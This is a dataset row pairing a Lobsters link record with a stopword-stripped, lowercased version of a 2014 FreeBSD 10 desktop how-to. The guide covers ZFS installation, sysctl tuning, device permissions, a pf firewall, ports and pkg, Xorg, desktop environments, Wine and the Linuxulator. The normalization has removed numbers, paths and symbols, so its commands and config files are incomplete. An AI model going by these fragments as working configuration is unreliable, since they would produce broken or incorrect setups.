518,Lobsters,freebsd,FreeBSD,A FreeBSD 10 Desktop How-to (2014),https://cooltrainer.org/a-freebsd-desktop-howto/,freebsd desktop howto,unixlike design fad du jour two time kowtow microsoft release engineering linux scratch gentoo installation new installation getting freebsd tier dd bsdinstall disk unix file system zfs write hole tuned advanced format aes instruction set guid partition table mbr finish upgrading chapter upgrade note preferred method first boot vi ee editorsvim bsdconfig environment variable locale character encoding unicode character set loginconf using localization locale tuning driver sysctl process scheduler loader mount procfs fdescfs sysctl su device permission device filesystem devfsconf devfsrules glob sound networking ifem ifre ifen handbook wired wireless wireless networking run wpasupplicant firewall pf entire book wwwsubsonic netmosh service pfctl installing software port collection port maintain wwwfirefox hier pkg poudriere pkg port sysutilstmux shellszsh tcsh shellsbash build setting qt qgtkstyle gtk network audio system staying date updating portsmgmtportupgrade portsmgmtportmaster using port going graphical xorg x window system devd dbus hal sysutilshal tab window manager install font available port arphicttf fontstd culmus elmar ipa ipa uigothic ipaex kochi migmix migu mona motoya sazanami shinonome takao umefont vlgothic hanazono mincho mikachan alee font nanum un font anonymous pro artwizaleczapka dejavu inconsolata terminus cantarell droid doulos sil ubuntu telugu isabella ecofont junicode khmeros padauk stix computer modern chari urw geminifonts cyrrfx paratype microsoft core font web fontconfig home directory starting x window maker xdguserdirs accessibilityredshift desktop entry ttys window maker automatic configuration hate manual configuration emulatorsvirtualboxoseadditions xorg configuration file composite exa radeonhd defunct manual configuration nvidia xorgconf desktop environment xwinman kde kde clementine login manager kdm mate née gnome policykit emerald window maker window maker nextstep sysutilswmcpuload netwmnd audiowmix enlightenment enlightenment version enlightenment foundation library xfce xfce kde common desktop environment cinnamon cinnamon gnome core apps gnome gnome yearslong fight care portability missing much tossed everything available setting registry break every new minor version opposed gnome shell extension use theme categorize application menu accessibility menu power computer magic altbutton toggle mate xfce cinnamon window maker theming gnomelook kdelook xfcelook boxlook kde system setting extra miscellany printing cup printcups hplip printhplip foomatic printfoomaticfilters printfoomaticdb printfoomaticdbengine printcupspdf http network protocol supported cup common network printer uris smrt sysutilssmartmontools smart java openjdk javaicedteaweb webcam dvb multimediawebcamd pwcview multimediapwcview cheese multimediacheese ibus ibus cjk textprocibus textprocibusqt linuxulator linuxulator system call translation adobe flash player linprocfs loki compatibility library package loki software wine emulatorswine emulatorswinedevel emulatorswinestaging emulatorswinegecko emulatorswinemono net framework emulatorswinetricks emulatorsswine browser plugins emulatorswinestaging humble store gog freedom planet linuxulator release ftp browser plugins npapi firefox chromium wwwfirefoxesr adobe flash player linuxulator wwwnspluginwrapper dropped support ppapi resumed linux npapi flash plugin development going need emulatorspipelight wine emulatorswinestaging wwwpipelight pkgmessage virtualization bhyve also support graphic emulatorsvirtualboxose skype audiomumble netimekiga linuxulator netimskype alsa compatibility shim freebsd missing syscalls locale available upgrade note vt syscons history gnome cinnamon hal slim wine firewalling desktop environment installation virtualization section,freebsd fast secure modern unixlike operating system fantastic community great documentation powerful technology like zfs llvm operating system choice everything desktop home router arm plug computer jukebox though famed uptime datacenter o suited desktop laptop computing little work use freebsd maybe getting old nice use operating system spawn billiondollar antimalware industry frequent security failing choose interface like reasonably expect stay way instead forced design fad du jour argue init system replaced two time decade whose key organization collectively kowtow microsoft convenient used many operating system yet find one consistent cohesive yet wellsupported bsd family freebsd one biggest community available driver thing like graphic card freebsd server linux desktop oftseen sentiment among freebsd enthusiast sort understandable considering conservative outofthebox freebsd installation despite freebsd setting away easy powerful desktop o rivaling linux complete software ecosystem available port collection unlike linux everything including kernel package freebsd developed single source tree released set schedule twice year complete operating system top install thirdparty software release engineering page track release history schedule two major branch see release parallel major branch tend live two year four minor version release freebsd currently newest release branch maintenance mode major development happening guide attempt show user various hardware configuration best way configure usable modern workstation running freebsd based experience emi freebsd workstation project trueos ghostbsd give good outofthebox desktop freebsd experience find disconnected underlying operating system dump kde xfce attempt hide much freebsd possible behind graphical configuration bad thing glad project exist guide get direction install freebsd learn work configure great desktop compare guide something like linux scratch gentoo installation see breeze really let new installation getting freebsd page link isos six tier architecture guide focus pc though broadly applicable isos available bootonly cd dvd memstick usually grab nearest usb drive dd newest memstick image larger dvd image available complete port distribution file fullyoffline installation boot chosen installation medium via whatever mean computer efi boot menu bios setting fallback get ready install freebsd boot bsdinstall offer install load interactive rescue shell boot normally installation disk choose install choose keyboard mapping appropriate computer enter hostname machine asked choose system component recommend selecting doc useful locally internet connection working system src needed port build install disk next screen partitioning select either auto zfs option auto ufs option ufs traditional unix file system usable machine fragile case power loss crash unless journaled zfs hand volume pool manager great filesystem strongly recommend zfs modern computer due resilience rich feature set make practical desktop use checksum data constantly ensure integrity prevent silent corruption ondisk copyonwrite model never overwrites block eliminating write hole support snapshot allowing snapshot filesystem arbitrary point time roll back like apple time machine snapshot sent seamlessly across network incremental backup support ssd cache device speed read writes pool backed magnetic hard drive deduplicate file reducing ondisk space file significantly identical cost lot ram achieving feature make zfs memoryhungry plan physical memory every space zpool much deduplication used zfs tuned tighter memory limitation limited system use ufs instead modern machine need tune zfs use memory available also respond memory pressure process need ram assuming choose zfs set zpool pool single disk still called stripe striped mirror combination disk raidz name pool something usually name boot pool hostname machine data pool function zfs option dictated hardware advanced format hard disk made last year ssd force sector computer recent intel amd cpu supporting aes instruction set little downside encrypting pool recommend pool need automatically mount boot ie use encryption workstation freebsd router encrypting multiple physical device key require passphrase prompted passphrase kernel loaded detecting hardware system passphrase prompt usually get buried usb device kernel enumerates find stuck boot hit key enter make passphrase prompt reappear use guid partition table gpt computer us efi pc bios likely need use legacy mbr gpt requirement use disk size mbr address maximum x byte larger amount swap space use dictated amount memory computer load plan place conventional wisdom say use swap size double amount physical memory machine find apply le le get doubledigit gigabyte ram computer physical memory swap space defined system touch swap recommend least enlarge later finish disk set installer copy file prompt base configuration thing root password time zone network option ask add least one nonroot user creating personal user account sure invite wheel operator user group wheel membership necessary gain root privilege administration task assign operator device permission later guide prompted remove install disk reboot new system upgrading running previous version already upgrade process covered full chapter handbook assuming running stock generic kernel process simple using freebsdupdate check upgrade note section specific version instruction first fetch new system using freebsdupdate install specifying r argument without r fetch security erratum update current minor version upgrade new minor version current major new major version entirely upgrading new major version go release first upgrade say first freebsdupdate upgrade r upgrade interactive ask confirm system component think installed fetch updated system file begin installation process install new kernel nonkernel o component like userland executables reboot via shutdown r reboot swift kick power switch system come log root install new userland rerunning install command point o ready go package need updated run new major version via preferred method pkgstatic upgrade f binary package portupgrade orportmaster af prefer build port alternatively possible maintain abi compatibility older major version freebsd installing compatibility library package unless need particular binary available source build new version done run freebsdupdate install one last time chean shared library previous version reboot final updated system first boot log root password configured installer congratulation freebsd user freebsd base system fullyfeatured operating system see contain graphical environment thirdparty software like typical linux distribution installing configure new system better desktop freebsd root academia datacenter default configuration conservative desktop laptop computer likely using vastly powerful configuration run freebsd room grow without unreasonable need text editor edit configuration file base system ship vi vim user would recommend ee part base system simple fullyfeatured editor like nano linux world happy ee plenty great editor install port like editorsvim let continue entirely comfortable editing config file reaccess graphical configuration screen installer running bsdconfig root think reading page case langxxyyzzzz environment variable set system locale language code xx country code yy character encoding zzzz language country code affect default application language number formatting date time formatting string collation currency setting enabling locale using character encoding system understand display character unicode character set instead u ascii default langc check locale grep list every available locale computer american anglophone use edit login class capability database etcloginconf add default character set locale login shell inherit environment variable defined default class narrower class match one etcloginconf loginconfdefault loginconf pseudoterminalsunlimited ignoretime rebuild login database capmkdb etcloginconf making change may specify new locale elsewhere like etcprofile non login shell us gdm login manager etcprofile export lang export charset read using localization chapter handbook check work running locale next login locale lcctype lccollate lctime lcnumeric lcmonetary lcmessages tuning driver change sysctl variable enhance experience freebsd desktop including expanding amount shared memory tuning process scheduler desktop use increasing limit simultaneouslyopen file something sensible etcsysctlconf enhance shared memory interface enhance desktop responsiveness high cpu use bump maximum number open file disable pc speaker shared memory chromium knob set boot loader setting bootloaderconf also define kernel module load boot bootloaderconf devil worship loader logo loaderlogo beastie boottime kernel tuning load mmcsd cardreader support mmcload yes mmcsdload yes sdhciload yes access atapi device cam subsystem atapicamload yes filesystems userspace fuseload yes intel core thermal sensor coretempload yes amd thermal sensor amdtempload yes inmemory filesystems tmpfsload yes asynchronous io aioload yes handle unicode removable medium libiconvload yes libmchainload yes yes msdosfsiconvload yes finally enable everything else etcrcconf mousedenable yes powerd hiadaptive speed ac power adaptive battery power powerdenable yes powerdflags hiadaptive b adaptive enable bluetooth hcsecdenable yes sdpdenable yes synchronize system time ntpdenable yes let ntpd make time jump larger ntpdflags g enable remote access via ssh plan use otherwise need expose system etcrcconf remote logins sshdenable yes mount procfs fdescfs virtual filesystems default part bsd frequently required compatibility program environment written linux mind gnomemate kde freebsd equivalent sysctl mount proc plan use software requiring special filesystems like fdescfs must mounted late zfsrooted system since location mountpoint exist late boot process etcfstab proc proc procfs rw fdesc devfd fdescfs rw auto late toggle sysctl let user mount disk etcsysctlconf allow user mount disk neglected add personal user account wheel operator group creation good time wheel membership let use su become root operator membership required device permission configuration example user okeeblow substitute pw usermod okeeblow g wheel pw usermod okeeblow g operator device permission relax default permission device filesystem allow normal user access variety disk inputoutput device permission device existing boot time set devfsconf line defines full device path octal permission value etcdevfsconf allow user access optical medium perm perm perm perm allow usb device mounted perm perm perm perm perm perm misc device perm perm perm perm perm perm perm perm device may connected postboot add entry devfsrules ruleset rulesets must unique name number rule composed path quoted path glob octal permission value etcdevfsrules add path ad mode add path ada mode add path da mode add path acd mode add path cd mode add path mmcsd mode add path pas mode add path xpt mode add path ugen mode add path usbctl mode add path usb mode add path lpt mode add path ulpt mode add path unlpt mode add path fd mode add path uscan mode add path video mode add path tuner mode add path dvb mode add path mode add path mode stream configuration device add path iicdev mode add path uvisor mode enable new ruleset etcrcconf devfssystemruleset devfsrulescommon sound enable sound support boot loaderconf load immediately kldload snddriver echo snddriverload yes bootloaderconf cat devsndstat see available device cat devsndstat freebsd audio driver newpcm installed device hda nvidia unknown pcm displayport play hda nvidia unknown pcm displayport play hda nvidia unknown pcm displayport play hda nvidia unknown pcm displayport play hda realtek pcm analog playrec hda realtek pcm analog playrec hda realtek pcm digital play hda realtek pcm digital play usb audio play default usb audio rec hwsnddefaultunit sysctl variable control default audio output want use spdif output onboard realtek audio set hwsnddefaultunit enabling hwsnddefaultauto boolean automatically assign hwsnddefaultunit newlyattached device etcsysctlconf spdif msi board nt automatically use new sound device networking enable networking install process good time example computer emi desktop wired network realtek interface name interface may vary based driver us driver built generic kernel interface visible running ifconfig common driver may see include ifem intel pro interface ifre realtek interface ifen midway interface read network configuration handbook learn possible configuration wired use dhcp slaac autodiscovery home network etcrcconf hostname emialoecooltrainerorg enable dhcp nt let dhclient block backgrounddhclient yes dhcp acceptrtadv bring interface get dhcp address immediately issuing ifconfig dhclient substituting name interface alternatively supply static network address computer default router etcrcconf hostname emialoecooltrainerorg inet netmask broadcast defaultrouter prefixlen wireless wifi configuration see wireless networking section handbook sometimes tether desktop android phone using run bg usb interface simple defining new virtual wlan interface configuring wpasupplicant wpa preshared key specifying ssid encryption standard wpa etcrcconf ssid doubleshot wpa dhcp etcwpasupplicantconf network ssid doubleshot psk pantsupantsu configuration example cover dualstacked network depending network may prefer enable prefer like enable prefer enable done rcconf etcrcconf yes etcsysctlconf accept router advertisement firewall run firewall window o x many linux distribution ship default firewall ruleset freebsd onesizefitsall firewall configuration include one best software firewall world pf courtesy openbsd project configuring firewall complex topic entire book matter shown ruleset computer rule single network interface defined top file extif macro change name computer interface seen ifconfig macro next line define tcp udp port ruleset allow incoming connection computer run ssh server default port run wwwsubsonic port http control port netmosh range open port additional service defining macro named service like ssh defined etcservices etcpfconf name network interface seen ifconfig extif macro define set tcp udp port open add additional port range separated comma udp mosh control http moshmitedu tcpservices ssh http udpservices block icmp request break thing like path mtu discovery macro define allowed icmp type additional type neighbor discovery rfc icmptypes echoreq unreach echoreq unreach modulate initial sequence number tcp packet broken operating system sometimes nt randomize number making guessable tcpstate flag ssa keep state udpstate keep state nt send rejection drop set blockpolicy drop exempt loopback interface prevent service utilizing local loop blocked accidentally set skip incoming traffic external interface normalized fragmented packet reassembled scrub extif fragment reassemble set default deny policy block log desktop permissive allowing outgoing connection pas quick modulate state enable antispoofing external interface antispoof extif inet antispoof extif block packet fail reverse path check look routing table check make sure outbound source came probably source address spoofed block urpffailed drop broadcast request quietly block quick extif allow service defined macro top file pas extif inet proto tcp port tcpservices tcpstate pas extif proto tcp port tcpservices tcpstate pas extif inet proto udp port udpservices udpstate pas extif proto udp port udpservices udpstate allow icmp pas inet proto icmp icmptype icmptypes keep state pas proto keep state enable firewall rcconf start echo pfenable yes etcrcconf service pf start making change ruleset check validity load new rule pfctl abort ruleset contains error unlike service pf restart stop fail start due error leave locked ssh ask know happen installing software freebsd historically famous port collection directory skeleton makefiles patch describing programmatically build package thirdparty software computer port contains metadata piece software including filename source archive hash file software dependency requires compiletime option available file installs patch necessary work around nonportable code fix issue upstreamed project every port maintainer whose job keep port date respond issue arise newer version operating system example check port maintain make port port collection downloads upstream source archive patch configures build customized binary package us freebsd underlying binary package manager install thirdparty software installed package manager end usrlocal mirror hierarchy usr might seem confusing two place give fairly clean separation base system package example usrlocalbin find firefox installing wwwfirefox usrbin find ee sed experienced configuration operating system done etc configuration file port usually usrlocaletc check hier manual full layout freebsd new binary package manager known pkgng pkg replaces old suite pkg tool pkgadd pkgdelete contains many advanced feature missing freebsd year compared old package manager pkgng support safe upgrade meaning save copy previousversion package roll back case failure multiple repository package staging install modern binary package format robust sqlitebased package registration database importantly remote binary package upgrade thanks pkgng possible add multiple remote binary package repository get update without relying building port freebsd project provide binary package built port tree using default option example installing binary package firefox pkg install firefox pkg install wwwfirefox equivalent portsnap fetch extract cd usrlocalwwwfirefox make install stick convention pkg install page name identical prefer build customized package port possible mix match binary package custom package built port using pkg lock unlock get advanced annoying appropriate guide build port one computer using poudriere use computer binary package repository freebsd computer network new user one computer stick pkg install default package server familiar o past recommended building port default binary package server due strange default port option lack package coverage certain software like kde day however recommend using binary package default unless find particular port option absolutely must even consider using poudriere create local package server instead building installing port traditional way work initially set save hassle updating shared library trying use computer old fashioned way replace start rebuilding port depend meanwhile currentlyinstalled software unusable due missing package avoid issue alert upfront build failure probably user day fine package provided freebsd project matter route choose begin updating pkg repository port tree pkg update fetch updated index every packagesite defined environment variable pkgconf port portsnap fetch extract retrieve new full port tree read pkg list command supported pkg read port list available make target port general use pkg install portname pkg install category portname cd usrports category portname make install install software choose build package port want customize option use make configrecursive port directory set port option advance continually interrupt build read option presented generally toggle option know default default reason chosen option run make configrecursive since likely dependency enabled first time option port option displayed run make install compile install custom package first thing usually install new system sysutilstmux shellszsh prefer venerable default tcsh might comfortable shellsbash installed changing user default shell simple chsh usrlocalbinzsh build setting thirdparty software option set compile time consider desktop use decide build customized package qt toolkit option set via combination following knob change qt installed need rebuild qgtkstyle selectable theme engine let qt application integrate closely gtk environment enabled qgtkstyle option enable option plan use gtkbased desktop environment like mate xfce built select gtk visual style cup standard printing engine free unixlike system support qt enabled cup option network audio system network transparent clientserver audio transport system enabled qt application setting na option echo cup qgtkstyle na etcmakeconf staying date updating port tree pkg catalogue alreadyinstalled computer suggest checking updating file also found usrportsupdating extracted port tree track breaking change package step necessary fix tell configuration file syntax changed fix dependency port split merge default version package change update alreadyextracted port tree newest revision portsnap fetch update two common tool programmatically upgrading port portsmgmtportupgrade portsmgmtportmaster prefer portupgrade portmaster stubbornly abort entire upgrade error might like common portmaster usage portmaster upgrade installed port usually update portupgrade rac r recursively update installed port c preemptively show new port option interrupt build using binary package update package repository catalog pkg update upgrade installed package pkg upgrade handbook detailed chapter using port includes upgrading task going graphical sure eager get textonly console need install xorg distribution x window system pkg install xorg xorg default us freebsd devd hardware detection dbus interprocess communication hal used default hardware detection mechanism process deprecation may need unless plan use desktop environment still depends check dependency sysutilshal list software still requiring etcrcconf haldenable yes dbusenable yes xorg display server need stuff display install application also need window manager handle displaying interacting application way expect modern o default x come tab window manager probably software would enjoy using century install font xorg include many attractive typeface default luckily plenty available port use including many nonroman language better unicode coverage new system usually install something like pkg install chinesearphicttf chinesefontstd hebrewculmus hebrewelmarfonts japanesefontipa japanesefontipauigothic japanesefontipaex japanesefontkochi japanesefontmigmix japanesefontmigu japanesefontmonaipa japanesefontmotoyaal japanesefontmplusipa japanesefontsazanami japanesefontshinonome japanesefonttakao japanesefontume japanesefontvlgothic japanesefontmikachan koreanaleefontsttf koreannanumfontsttf koreanunfontscore includes arphicttf fontstd chinese coverage culmus elmar hebrew language coverage ipa ipa uigothic ipaex kochi migmix migu mona motoya sazanami shinonome takao umefont vlgothic hanazono mincho mikachan japanese language coverage alee font nanum un font korean language coverage anonymous pro artwizaleczapka dejavu inconsolata terminus terminal editor cantarell droid doulos sil ubuntu general roman alphabet language coverage telugu telugu language isabella ecofont junicode novelty typeface khmeros khmer language coverage padauk myanmar language coverage stix computer modern technical mathematic symbol chari urw geminifonts cyrrfx paratype cyrillic eastern european language coverage special case includes microsoft core font web andale verdana valid microsoft window license get tahoma well adding etcmakeconf building custom package etcmakeconf enable tahoma window license show show mine curdir withmswindowslicenseyes endif font installed need tell xorg using fontpath used unfortunately font path port entirely standardized end end usrlocalsharefonts usrlocalshare relevant section xorgconf look similar past necessary tell x installed font using fontpath directive xorgconf day software detect automatically using fontconfig probably run case need manually inform x server font like section file fontpath fontpath fontpath usrlocalsharefontmonaipa endsection install invididual font later single user copying inside font directory home directory rescan configured fontpaths automaticallydetected font running fccache vf list installed font fclist check appear example fairly large local font repository font directory font available system writing according fclist wc l starting x shell script xinitrc home directory script executed lifecycle x session xinitrc used run startup application run window manager finally end x session window manager exit xinitrc return x server stop simple example xinitrc xinitrc xscreensaver nosplash xdguserdirsupdate redshift compton exec wmaker example xinitrc use window maker start xdguserdirs accessibilityredshift lightweight compositor starting graphical session logging tty commandline login prompt traditional way easy running command startx loggin user run x root prefer use graphical login manager desktop environment include like kde kdm computer use environmentagnostic graphical login manager besides nicer look also protects leaving loggedin user session even worse root session tty could used someone walking computer configure login manager start boot adding either kdmenable yes slimenable yes etcrcconf would recommend confident everything set correctly difficult fix config file computer automatically start broken x server test plain old startx first test login manager service slim onestart service kdm onestart enabling every boot configure sessiondir directive slim configuration file define path desktop entry installed port usually usrlocalsharexsessions use exec instead particular window manager executable name xinitrc run command slim passed argument usrlocaletcslimconf sessiondir usrlocalsharexsessions echo slimenable yes etcrcconf service slim start xinitrc switch session window manager key slim login screen x session use one virtual ttys started switch different virtual tty ctrlatlf switch back graphical tty may need create desktop entry window manager choice port maintainer ship one example window maker usrlocalsharexsessionswmakerdesktop desktop entry namewindow maker execusrlocalbinwmaker commentthis session log window maker typeapplication automatic configuration version xorg since supported autoconfiguration display device hal automatically detects input device fontconfig automatically detects font may never need set xinitrc use window manager choice give startx try hopefully work flawlessly feel free skip section manual configuration necessary need force specific video driver toggle specific option hate feel like learning one worst configuration file format time manual configuration section explains manually configure x system using amd radeon radeon driver intel grahpics chip intel driver virtualized graphic card like emulatorsvirtualboxoseadditions vboxvideo generic framebuffer device supported default vesa driver autodetection work root run x configure spit new xorg configuration file rootxorgconfnew based detected hardware copy file pull text editor modification add extension section enable composite extension section extension option composite enable endsection add one line serverlayout section enable aiglx section serverlayout identifier xorg configured screen inputdevice corepointer inputdevice corekeyboard option aiglx true endsection usually enable exa accelmethod dri adding respective line device section radeon card ensure driver configured radeon radeonhd radeonhd older novellsponsored defunct driver radeon hd hardware configure like pick default installed use radeon instead otherwise x configure pick best driver section device option accelmethod exa option dri true identifier driver radeon vendorname advanced micro device amd nee ati boardname radeon hd busid endsection enable freetype bitmap x font module adding module section according manual extmod dbe dri glx record extension module loaded automatically present like go explicit configuration define anyway section module load dbe load dri load load extmod load record load freetype load bitmap load load glx endsection manual configuration nvidia skip section use nvidia graphic card automatic configuration work binary proprietary software system much prefer free open solution found neither nouveau free radeon intel driver compare speed feature support nvidia official driver install driver load nvidia kernel module boot enable bootloaderconf echo nvidiamodesetload yes bootloaderconf run nvidiaxconfig get base xorgconf pull favourite text editor add module section enable glx extension section module load freetype load bitmap load load glx endsection later booted graphical environment use nvidiasettings configure twinview setting desktop environment best part x window system ecosystem variety environment available might prefer configurability kde sparse cleanliness mate something minimal like window maker even tiling like xwinman included screenshots description popular environment give idea kde kde largest fullyfeatured free software desktop environment based qt toolkit configuration option dizzyingly numerous excellent support modern technology like highdpi display modern compositing window manager kwin web file browser konqueror famously spawned khtml engine became webkit family qt application like excellent clementine metaport available start kde exec startkde xinitrc kde also includes graphical login manager kdm optionally enable rcconf start service echo yes etcrcconf service start mate née gnome gnome venerable desktop environment made famous ubuntu default around mate community fork gnome gnome team lost collective mind mate user configure policykit allow normal user mount removable medium automatically usrlocaletcpolicykitpolicykitconf config version match action orgfreedesktophalstoragemountremovable return result yes match match action orgfreedesktophalstoragemountfixed return result yes match match user root return result yes match defineadminauth group wheel config mate include gdm alternative start exec matesession xinitrc using either startx slim compiz popular alternative window manager mate gnome user give fancy wobbly window cube kind flashy stuff install compizfusion sure disable obsolete unmaintained window decorator emerald leftover beryl project prompted port configuration screen emerald disabled compiz default gtkwindowdecorator take normal gtk theme appearance transparency garish animation installed open setting preference compizconfig setting manager probably want enable following plugins minimum general gnome compatibility desktop desktop cube rotate cube effect animation window decoration wobbly window window management application switcher move window place window resize window open run box execute compizmanager compizmanager script detecting using proper compiz option video hardware screen flash compiz gtkwindowdecorator initialize replace marco mate default window manager window missing titlebars doublecheck enabled window decoration ccsm seems well add compizmanager new startup application setting preference startup application change mate window manager preference dconf gsettings set orgmatesessionrequiredcomponents windowmanager compiz switch back use command argument marco window maker popular wellknown others window maker favorite longestused window manager based look feel nextstep operating system o became rhapsody mac o x io unlike extremely limited onedimensional mac o x dock window maker offer main dock well clip dock unique virtual desktop dock hold normal launcher dockapps small selfcontained dock accessory install window maker start exec wmaker xinitrc addition also show sysutilswmcpuload netwmnd audiowmix first time start window maker run wmakerinst install starter configuration gnustep directory enlightenment enlightenment original eyecandy desktop modern compositor even thing version ambitious rewrite release almost never came got door since followed steady update schedule longer vaporware contains eyecatching desktop built project enlightenment foundation library shiny bouncy extendable configurable install run exec enlightenmentstart xinitrc xfce xfce descends like kde design onceproprietary common desktop environment xfce however desktop become gnomelite gtk desktop environment much say functional lightweight desktop panel window manager great file manager thunar lightweight application like terminal start xfce exec xinitrc cinnamon cinnamon gtk desktop environment linux mint project began fork gnome shell traditional panel menu ui since many dissatisfied drastic redesign beloved environment come modern de offer everything would expect gnome mate cohesive feel fork several gnome core apps install cinnamon start exec cinnamonsession xinitrc also fallback softwarerendering mode started exec instead gnome gnome available linux since spring finally available official freebsd tree november three half year delay thanks upstream gnome project yearslong fight operating system penguin mascot took several year vastly waning userbase suddenly care portability sure okay either way install missing much delay since gnome team tossed everything great onceubiquitous de turned shiny unconfigurable io imitator basic feature option either available buried inside setting registry reminiscent window bsd relegated extension break every new minor version thanks lack stable extension api whose existence opposed many main project contributor take look gnome shell extension page amused need extension use theme categorize application menu remove otherwiseomnipresent accessibility menu status bar even power computer without knowing magic altbutton toggle want great gtkbased desktop environment maintained team hate check mate xfce cinnamon three excellent guess thank gnome project selfdestruction getting back window maker theming finding clearlooks drab blue find world theme icon mate gnomelook kde kdelook xfce xfcelook several lightweight window manager boxlook several attractive usable theme buried among o x aqua clone vista aero clone blackasmysoul darknessfests standard theming website change theme setting application kde qt application like clementine kde system setting gtk selectable many window manager appearance preference also install light gtk theme switcher extra miscellany printing cup standard printing free unixlike system installed port along needed filter install cup metaport printcups install hplip printhplip hp printer driver brother reason install foomatic filter collection printfoomaticfilters database engine printfoomaticdb printfoomaticdbengine respectively find cupspdf virtual printer printcupspdf useful well enable cup installed etcrcconf disable line printer daemon since cup lpdenable enable cup cupsdenable yes add local user cup group want able print pw usermod root g cup pw usermod okeeblow g cup start cup service service cupsd start able access web configuration ui http web browser may prompt root password write config file usrlocaletccups full desktop environment include gui control cup add printer web interface available web interface builtin documentation help configure different model printer specifically network protocol supported cup common network printer uris section smrt sysutilssmartmontools installs smartd smartctl daemon utility checking smart status local disk enable sample smartdconf contains one directive devicescan cause smartd scan attached drive cp usrlocaletcsmartdconfsample usrlocaletcsmartdconf echo smartdenable yes etcrcconf service smartd start check smart status drive directly smartctl root h flag show basic pas fail health status flag show everything smartctl h smartctl freebsd local build copyright c bruce allen christian franke wwwsmartmontoolsorg start read smart data section smart overallhealth selfassessment test result passed java freebsd several available java provider including openjdk sun oracle jdk recommend newest openjdk people far easier install binary oracle jre requires logging web page agreeing license manually downloading distfile port time writing newest openjdk openjdk available well software run java need java browser plugin install javaicedteaweb java provider available webcam dvb usb webcam many dvb tuner supported multimediawebcamd webcamd depends userland character device driver install enable rcconf loaderconf etcrcconf webcam daemon webcamdenable yes bootloaderconf userland character device driver webcam yes use camera device pwcview available multimediapwcview cheese multimediacheese cheese provides nice interface similar apple photobooth o x heavy gnome library dependency may want system ibus ibus modern ime unixlike system allowing one input cjk language install main ime textprocibus well qt application support textprocibusqt need one input method ime installed port interest heavyweight desktop environment like gnome kde let configure input method graphically gnome mate example open ibus preference setting preference menu kdeqt user enable default ime lightweight window manager user like start xinitrc xinitrc export xmodifiers imibus export gtkimmodule ibus export qtimmodule ibus exec ibusdaemon x run gtk qt application press keyboard shortcut switch input method test linuxulator freebsd linuxulator allows run linux application binary using system call translation desktop user find useful running handful proprietary necessary program available linux freebsd adobe flash player install linux base distribution port write default base distribution based centos replacing old fedora based newer centos also available become default point future chosen linuxbase installed tell system load linux kernel module boot echo linuxload yes bootloaderconf kldload linux mount linprocfs virtual filesystems compatibility gnome program requiring etcfstab linproc compatlinuxproc linprocfs auto late rw besides proprietary garbageware like flash player also use linuxulator along loki compatibility library package run loki software linux port best pc game ever made like simcity unlimited wine wine free implementation api capable running real window application unixlike system available emulatorswine emulatorswinedevel emulatorswinestaging containing latest stable unstable staging version respectively optional emulatorswinegecko mshtmldll replacement allow window program embed web page using mozilla engine optional emulatorswinemono let wine run window program written version net framework without using proprietary net runtime also install emulatorswinetricks script containing wine installation recipe popular software may find wine gui emulatorsswine useful maintaining separate wine prefix installing wine freebsd system normally precludes running window software aka software probably care workaround wine package also available install plan use wine run browser plugins use stagingpatched version wine emulatorswinestaging wine impressivelycompatible day use run lot game humble store gog fire window computer vm wine good used create linux version many title freedom planet case lot easier run executable freebsd wine try get linux wine binary running via linuxulator every wine command fails elf interpreter found system missing library necessary wine need install release ftp grab matching version o extract either root sudo root filesystem install archive contains full directory hierarchy file end right place fetch ftp tar xfp c browser plugins note npapi deprecation firefox chromium deprecating support npapi plugins everything section stop working time chromium removed support version firefox last version support available wwwfirefoxesr release esr adobe flash player released freebsd usable freebsd choice two wrapper linux version flash plugin installed via executed linuxulator adapted native browser wwwnspluginwrapper adobe dropped support npapi linux version flash version back left development google deprecated npapi released ppapi version many year part proprietary chrome browser bundle something even available freebsd adobe surprising move resumed linux npapi flash plugin development use nspluginwrapper make sure linprocfs mounted execute nspluginwrapper v normal user locate enable linux flash plugin automatically find available plugins installs important remember make copy flash library home directory every time update version flash installed port need remove local cory nspluginwrapper v r install new one nspluginwrapper v adobe promised security update npapi flash player history indication going need newer arguably better solution emulatorspipelight winebased wrapper window browser plugins support newest version window flash freeing u limitation adobe linux development also support shockwave silverlight unity widevine requires special patched version wine emulatorswinestaging installed activate plugins root pipelightplugin update pipelightplugin createmozillaplugins pipelightplugin enable flash silverlight available well allow watch drmed netflix content via browser freebsd experience using since buy drmed streaming medium subscription installed way pipelightplugin enable heed wwwpipelight pkgmessage warning silverlight drm zfsbased system user running zfs root watching drm protected content requires extensive xattr support run issue drm failing use pipelightmkufs command create ufs formatted zvol mounted user winepipelight directory plugins enabled way list available plugins seen pipelightplugin help virtualization pretty common virtualize another operating system computer possibly run proprietary program access proprietary office groupware system whatever reason easy accomplish freebsd freebsd new builtin hypervisor known bhyve capable running freebsd natively operating system via originally bhyve supported serial console freebsd also support graphic alternatively virtualbox open source edition available emulatorsvirtualboxose build guest addition enabled best experience virtualizing window linux use virtualbox configure loaderconf load virtualbox kernel module configure rcconf start virtualbox bridged networking bootloaderconf etcrcconf etcdevfsconf allow virtualbox network access vboxnetctl root vboxusers perm vboxnetctl pw usermod okeeblow g vboxusers skype skype bad proprietary software value freedom use audiomumble netimekiga instead still wish use skype make sure linuxulator enabled install netimskype version skype linux client dropped support os found freebsd default sound api thanks skype persisted year version port introduction alsa compatibility shim freebsd use newer alsaonly skype client alsa client unlike old os client requires explicit configuration use sound device must defined manually compatlinuxetcalsapcmpcmossconf configuration file alsapluginsoss example enable audio output usb webcam microphone source compatlinuxetcalsapcmpcmossconf type os device hint description open sound system webcam type os device hint description open sound system webcam type os device hint description open sound system spdif type os device hint description open sound system spdif even newer skype client available version usable freebsd due missing syscalls branch linuxulator work via pulseaudio freebsd later skype load wrapper module kldload echo yes bootloaderconf microphone volume controlled invoking mixer chosen recording device let raise microphone volume mixer f mic locale personal preference also set lctime environment variable endk fauxlocale date format instead ridiculous american standard quick date oh course locale included freebsd base system many linux distribution available ivan voras blog tar c usrsharelocale zxf enable login database etcprofile etcloginconf ignoretime etcprofile export lctime upgrade note guide assumes track newest stable branch upgrading new stable branch initial release thing would ever recommend o x burned new major freebsd version yet section note thing need know keep system top shape upgrading updating higher run rebooting new o conversion script convert list installed package format used old pkg tool format used pkgng new binary package manager neglect step o think package installed life become confusing withnewxorg longer thing old version gone vt new console driver designed replace syscons offer unicode graphic support using kernel modesetting necessary support uefi loader variable kernvty select vt sc bootloaderconf default graphic mode configured use text mode instead necessary bootloaderconf history cover freebsd recommend package port rearrange build xorg section suggest xorg autoconfiguration nvidia nvidiamodeset new screenshots stop mentioning gnome gone winecompholio winestaging gone added npapi deprecation flash whoop 